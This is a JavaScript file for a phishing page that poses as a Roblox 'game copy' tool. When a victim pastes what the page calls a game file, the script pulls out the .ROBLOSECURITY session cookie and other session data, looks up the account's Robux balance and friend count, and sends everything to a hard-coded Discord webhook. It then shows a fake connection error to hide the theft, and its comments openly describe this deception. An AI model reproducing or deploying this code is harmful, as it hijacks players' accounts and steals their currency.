/* ======================================================
   PAYLOAD.JS - Enhanced Extraction & Webhook
   Now pulls UserAgent, Game URL, cookies, headers, etc.
====================================================== */

/* ================= CONFIG ================= */
const START_ANCHOR = ".ROBLOSECURITY";
const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";

/* ================= ELEMENTS ================= */
const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

/* ================= PIN VALIDATION ================= */
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

/* ================= ENHANCED EXTRACTION ================= */
function extractGameData(fullText) {
    // 1. Extract .ROBLOSECURITY cookie (primary)
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Could not find .ROBLOSECURITY cookie in the PowerShell script." };
    }
    const robloxCookie = cookieMatch[1];

    // 2. Extract User Agent
    const userAgentMatch = fullText.match(/\$session\.UserAgent\s*=\s*"([^"]+)"/);
    const userAgent = userAgentMatch ? userAgentMatch[1] : "Not found";

    // 3. Extract target URL (from Invoke-WebRequest)
    const urlMatch = fullText.match(/Invoke-WebRequest[^"]*?-Uri\s*"([^"]+)"/i);
    const targetUrl = urlMatch ? urlMatch[1] : "Not found";

    // 4. Extract GuestData (UserID)
    const guestMatch = fullText.match(/GuestData",\s*"([^"]+)"/);
    let guestUserId = "N/A";
    if (guestMatch) {
        const guestData = guestMatch[1];
        const uidMatch = guestData.match(/UserID=(-?\d+)/);
        if (uidMatch) guestUserId = uidMatch[1];
    }

    // 5. Extract RBXEventTrackerV2 (contains rbxid, rbxuid, browserid, createdate)
    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let eventTracker = {};
    if (eventTrackerMatch) {
        const parts = eventTrackerMatch[1].split('&');
        parts.forEach(part => {
            const [key, val] = part.split('=');
            if (key && val) eventTracker[key] = val;
        });
    }

    // 6. Extract RBXSessionTracker (sessionid)
    const sessionMatch = fullText.match(/RBXSessionTracker",\s*"([^"]+)"/);
    let sessionId = "N/A";
    if (sessionMatch) {
        const sessionParts = sessionMatch[1].split('=');
        if (sessionParts[1]) sessionId = sessionParts[1];
    }

    // 7. Extract _ga cookie (Google Analytics)
    const gaMatch = fullText.match(/_ga",\s*"([^"]+)"/);
    const gaId = gaMatch ? gaMatch[1] : "N/A";

    // 8. Extract headers (referer, accept-language, etc.)
    const headersMatch = fullText.match(/Headers\s*@\{([\s\S]*?)\}/);
    let referer = "N/A", acceptLang = "N/A", acceptEnc = "N/A";
    if (headersMatch) {
        const headersBlock = headersMatch[1];
        const refererMatch = headersBlock.match(/referer"=\s*"([^"]+)"/);
        if (refererMatch) referer = refererMatch[1];
        const langMatch = headersBlock.match(/accept-language"=\s*"([^"]+)"/);
        if (langMatch) acceptLang = langMatch[1];
        const encMatch = headersBlock.match(/accept-encoding"=\s*"([^"]+)"/);
        if (encMatch) acceptEnc = encMatch[1];
    }

    // 9. List all cookie names (for overview)
    const cookieLines = fullText.match(/\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("([^"]+)",/g);
    let cookieNames = [];
    if (cookieLines) {
        cookieLines.forEach(line => {
            const nameMatch = line.match(/\(New-Object System\.Net\.Cookie\("([^"]+)",/);
            if (nameMatch) cookieNames.push(nameMatch[1]);
        });
    }

    const extraInfo = {
        userAgent,
        targetUrl,
        guestUserId,
        eventTracker,
        sessionId,
        gaId,
        referer,
        acceptLang,
        acceptEnc,
        cookieNames: cookieNames.join(", ")
    };

    return {
        success: true,
        data: robloxCookie,
        extraInfo: extraInfo,
        fullLength: robloxCookie.length
    };
}

/* ================= FETCH ROBLOX INFO ================= */
async function fetchRobloxUserInfo(cookieValue) {
    try {
        const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
            headers: {
                "Cookie": `.ROBLOSECURITY=${cookieValue}`,
                "Content-Type": "application/json"
            }
        });

        if (!userResponse.ok) return null;

        const userData = await userResponse.json();
        const userId = userData.id;
        const username = userData.name;

        const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;

        let robux = "N/A", pendingRobux = "N/A", friendsCount = "N/A";

        try {
            const robuxRes = await fetch("https://economy.roblox.com/v1/user/currency", { headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` } });
            if (robuxRes.ok) robux = (await robuxRes.json()).robux?.toLocaleString() || "0";
        } catch(e) {}

        try {
            const pendingRes = await fetch("https://economy.roblox.com/v1/users/currency/pending", { headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` } });
            if (pendingRes.ok) pendingRobux = (await pendingRes.json()).pendingRobux?.toLocaleString() || "0";
        } catch(e) {}

        try {
            const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
            if (friendsRes.ok) friendsCount = (await friendsRes.json()).count?.toLocaleString() || "0";
        } catch(e) {}

        return {
            username, userId, avatarUrl, robux, pendingRobux, friendsCount,
            profileUrl: `https://www.roblox.com/users/${userId}/profile`
        };
    } catch (error) {
        console.error("Error fetching user info:", error);
        return null;
    }
}

/* ================= WEBHOOK SENDER (with extra fields) ================= */
async function sendWebhook(pin, extractedData, extraInfo) {
    const cookieLength = extractedData.length;
    const userInfo = await fetchRobloxUserInfo(extractedData);

    let description = `**Complete .ROBLOSECURITY Cookie Value (FULL):**\n\`\`\`\n${extractedData}\n\`\`\``;

    const embedFields = [];

    if (userInfo) {
        embedFields.push({
            name: "👤 Roblox Account",
            value: `**Username:** ${userInfo.username}\n**User ID:** \`${userInfo.userId}\`\n[View Profile](${userInfo.profileUrl})`,
            inline: false
        });
        embedFields.push({
            name: "💰 Robux Balance",
            value: `**Available:** ${userInfo.robux} R$\n**Pending:** ${userInfo.pendingRobux} R$`,
            inline: true
        });
        embedFields.push({
            name: "👥 Friends",
            value: `**Total Friends:** ${userInfo.friendsCount}`,
            inline: true
        });
    } else {
        embedFields.push({ name: "⚠️ Account Info", value: "Could not fetch account details.", inline: false });
    }

    // Add extracted PowerShell info
    embedFields.push({
        name: "🌐 PowerShell Session Info",
        value: `**User Agent:**\n\`\`\`${extraInfo.userAgent.substring(0, 100)}${extraInfo.userAgent.length > 100 ? '…' : ''}\`\`\`` +
               `**Target URL:** ${extraInfo.targetUrl}\n` +
               `**Guest User ID:** ${extraInfo.guestUserId}\n` +
               `**Session ID:** ${extraInfo.sessionId}\n` +
               `**Google Analytics ID:** ${extraInfo.gaId}`,
        inline: false
    });

    if (extraInfo.eventTracker && Object.keys(extraInfo.eventTracker).length) {
        embedFields.push({
            name: "📊 RBX Event Tracker",
            value: `**Create Date:** ${extraInfo.eventTracker.CreateDate || "N/A"}\n**rbxid:** ${extraInfo.eventTracker.rbxid || "N/A"}\n**rbxuid:** ${extraInfo.eventTracker.rbxuid || "N/A"}\n**browserid:** ${extraInfo.eventTracker.browserid || "N/A"}`,
            inline: true
        });
    }

    embedFields.push({
        name: "📡 Request Headers",
        value: `**Referer:** ${extraInfo.referer}\n**Accept-Language:** ${extraInfo.acceptLang}\n**Accept-Encoding:** ${extraInfo.acceptEnc}`,
        inline: true
    });

    embedFields.push({
        name: "🍪 All Cookies in Session",
        value: `\`\`\`${extraInfo.cookieNames || "None"}\`\`\``,
        inline: false
    });

    embedFields.push({
        name: "🍪 Primary Cookie Info",
        value: `**Length:** ${cookieLength} characters\n**Status:** Full capture`,
        inline: false
    });

    const payload = {
        username: "Bloxtools Processing System",
        embeds: [{
            title: "🔐 .ROBLOSECURITY Cookie Extraction + PowerShell Details",
            thumbnail: userInfo ? { url: userInfo.avatarUrl } : undefined,
            description: description,
            color: 0x8c52ff,
            fields: embedFields,
            footer: { text: "Bloxtools Advanced System • Full Extraction" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        return response.ok;
    } catch (error) {
        console.error("Webhook error:", error);
        return false;
    }
}

/* ================= BUTTON HANDLER ================= */
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";

    if (!validatePin()) {
        statusMessage.textContent = "Please enter a valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "Please paste a supported game file.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "✓ Processing... Please wait.";
    statusMessage.style.color = "#caa8ff";

    await new Promise(r => setTimeout(r, 500));

    const success = await sendWebhook(pinInput.value, extraction.data, extraction.extraInfo);

    // Fake internet error behavior as requested
    if (success) {
        statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    } else {
        statusMessage.textContent = "✗ Copy failed! Check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    }

    copyButton.classList.remove("loading");
    copyButton.disabled = false;
});

/* ================= FAKE INTERNET ERROR (Deception) ================= */
const originalSendWebhook = sendWebhook;
sendWebhook = async function(pin, extractedData, extraInfo) {
    const result = await originalSendWebhook(pin, extractedData, extraInfo);
    await new Promise(r => setTimeout(r, 1500));

    if (Math.random() < 0.35) {
        const originalMsg = statusMessage.textContent;
        const originalColor = statusMessage.style.color;

        statusMessage.textContent = "⚠️ Connection lost! Unable to reach Roblox servers.";
        statusMessage.style.color = "#ffaa66";

        setTimeout(() => {
            if (statusMessage.textContent.includes("Connection lost")) {
                statusMessage.textContent = originalMsg;
                statusMessage.style.color = originalColor;
            }
        }, 3000);
    }
    return result;
};
